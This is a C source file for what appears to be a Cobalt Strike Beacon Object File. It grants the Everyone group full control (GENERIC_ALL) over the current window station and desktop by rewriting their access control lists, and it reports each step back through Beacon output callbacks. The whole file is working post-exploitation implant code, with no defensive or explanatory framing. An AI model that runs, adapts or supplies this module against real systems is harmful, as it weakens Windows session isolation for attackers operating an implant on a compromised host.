#include <windows.h>
#include <aclapi.h>
#include "bofdefs.h"
#include "base.c"


void ModifyDesktopSecurity() {
    HWINSTA hWinSta;
    HDESK hDesktop;
    SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
    PACL pDacl = NULL, pNewDacl = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    EXPLICIT_ACCESS ea;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    PSID pEveryoneSID = NULL;

    // Get the current process's window station
    hWinSta = USER32$GetProcessWindowStation();
    if (hWinSta == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get window station. Error: %lu\n", KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Window station obtained successfully %x.\n",hWinSta );

    // Get the current thread's desktop
    hDesktop = USER32$GetThreadDesktop(KERNEL32$GetCurrentThreadId());
    if (hDesktop == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get desktop. Error: %lu\n", KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Desktop obtained successfully %x.\n", hDesktop);

    // Create a SID for the Everyone group
    if (!ADVAPI32$AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID)) {
        BeaconPrintf(CALLBACK_OUTPUT, "AllocateAndInitializeSid Error %u\n", KERNEL32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "SID for Everyone group created.\n");

    // Initialize an EXPLICIT_ACCESS structure for the new ACE
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName  = (LPTSTR)pEveryoneSID;

    // Get the current security descriptor for the window station
    if (ADVAPI32$GetSecurityInfo(hWinSta, SE_WINDOW_OBJECT, si, NULL, NULL, &pDacl, NULL, &pSD) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get security info. Error: %lu\n", KERNEL32$GetLastError());
        if (pEveryoneSID) ADVAPI32$FreeSid(pEveryoneSID);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Security info WINSTA retrieved successfully.\n");

    // Create a new DACL with the new ACE
    if (ADVAPI32$SetEntriesInAclA(1, &ea, pDacl, &pNewDacl) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "SetEntriesInAcl Error %u\n", KERNEL32$GetLastError());
        if (pEveryoneSID) ADVAPI32$FreeSid(pEveryoneSID);
        if (pSD) KERNEL32$LocalFree(pSD);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "New DACL WINSTA created successfully.\n");

    // Set the new security descriptor for the window station
    if (ADVAPI32$SetSecurityInfo(hWinSta, SE_WINDOW_OBJECT, si, NULL, NULL, pNewDacl, NULL) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to set security info. Error: %lu\n", KERNEL32$GetLastError());
        if (pEveryoneSID) ADVAPI32$FreeSid(pEveryoneSID);
        if (pNewDacl) KERNEL32$LocalFree(pNewDacl);
        if (pSD) KERNEL32$LocalFree(pSD);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Security info WINSTA set successfully.\n");

    // Get the current security descriptor for the desktop
    if (ADVAPI32$GetSecurityInfo(hDesktop, SE_WINDOW_OBJECT, si, NULL, NULL, &pDacl, NULL, &pSD) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get security info. Error: %lu\n", KERNEL32$GetLastError());
        if (pEveryoneSID) ADVAPI32$FreeSid(pEveryoneSID);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Security info DESKTOP retrieved successfully.\n");

    // Create a new DACL with the new ACE
    if (ADVAPI32$SetEntriesInAclA(1, &ea, pDacl, &pNewDacl) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "SetEntriesInAcl Error %u\n", KERNEL32$GetLastError());
        if (pEveryoneSID) ADVAPI32$FreeSid(pEveryoneSID);
        if (pSD) KERNEL32$LocalFree(pSD);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "New DACL DESKTOP created successfully.\n");

    // Set the new security descriptor for the desktop
    if (ADVAPI32$SetSecurityInfo(hDesktop, SE_WINDOW_OBJECT, si, NULL, NULL, pNewDacl, NULL) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to set security info. Error: %lu\n", KERNEL32$GetLastError());
        if (pEveryoneSID) ADVAPI32$FreeSid(pEveryoneSID);
        if (pNewDacl) KERNEL32$LocalFree(pNewDacl);
        if (pSD) KERNEL32$LocalFree(pSD);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Security info DESKTOP set successfully.\n");

    // Clean up
    if (pEveryoneSID) ADVAPI32$FreeSid(pEveryoneSID);
    if (pNewDacl) KERNEL32$LocalFree(pNewDacl);
    if (pSD) KERNEL32$LocalFree(pSD);
}

#ifdef BOF
void go(char * args, int len) {
   ModifyDesktopSecurity();
}

#else

int main()
{
    ModifyDesktopSecurity();
}

#endif